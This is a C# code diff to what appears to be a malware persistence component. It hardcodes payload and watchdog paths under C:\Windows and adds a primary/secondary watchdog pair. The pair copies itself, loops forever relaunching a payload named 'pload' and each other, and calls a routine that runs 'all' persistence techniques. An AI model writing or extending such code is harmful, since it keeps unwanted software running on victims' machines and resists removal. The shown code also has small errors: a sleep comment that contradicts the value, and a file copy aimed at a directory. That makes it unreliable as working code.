@@ -23,23 +23,23 @@ Persistence functionality
 
 class Watchdog
 {
+    public static string? BinaryPath { get; private set; } = @"C:\Windows\Test2";
+    public static string? BinaryName { get; private set; } = "pload";
 
 
-    // Defaults to putting the file in the System32 directory and the binary name pload
-      public static string? BinaryPath { get; private set; } = null;
-    public static string? BinaryName { get; private set; } = null;
-    public static string? PrimaryWatchdogMutexName { get; private set; } = null;
-    public static string? SecondaryWatchdogPath { get; private set; } = null;
-    public static string? SecondaryWatchdogName { get; private set; } = null;
-    public static string? SecondaryWatchdogMutexName { get; private set; } = null;
-    public static string? PrimaryWatchdogPath { get; private set; } = null;
+ 
+    public static string? SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
+    public static string? SecondaryWatchdogName { get; private set; } = "Wdog2";
+    public static string? SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
+
+
+    public static string? PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
+    public static string? PrimaryWatchdogName { get; private set; } = "Wdog1";
+    public static string? PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
 
 
     static void Main(string[] args)
     {
-        string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName", "PrimaryWatchdogMutexName", "PrimaryWatchdogPath" };
-        watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);
-
         // Create or open the mutex to ensure only one instance is running
         using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
         {
@@ -57,18 +57,20 @@ class Watchdog
 
     static void WatchdogLogic()
     {
+        string BinaryFullPath = Path.Combine(BinaryPath, BinaryName);
+        string SecondaryWatchdogFullPath = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);
+        File.Copy(Path.Combine(Directory.GetCurrentDirectory(), PrimaryWatchdogName), SecondaryWatchdogPath, overwrite: false);
+
         // Example loop to simulate frequent checks
         while (true)
         {
+            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(BinaryPath, BinaryName);
+            watchdogHelper.watchdogHelper.CheckAndRunPayload(BinaryPath, BinaryName);
 
-            watchdogHelper.watchdogHelper.CheckBinary(SecondaryWatchdogPath, SecondaryWatchdogName);
-            watchdogHelper.watchdogHelper.CheckBinary(BinaryPath, BinaryName);
+            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
+            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);
+
             Persistence.Persistence.runAllTechniques();
-
-
-
-
-
 
             Console.WriteLine("Watchdog is monitoring...");
             Thread.Sleep(10000);  // Sleep for 1 second
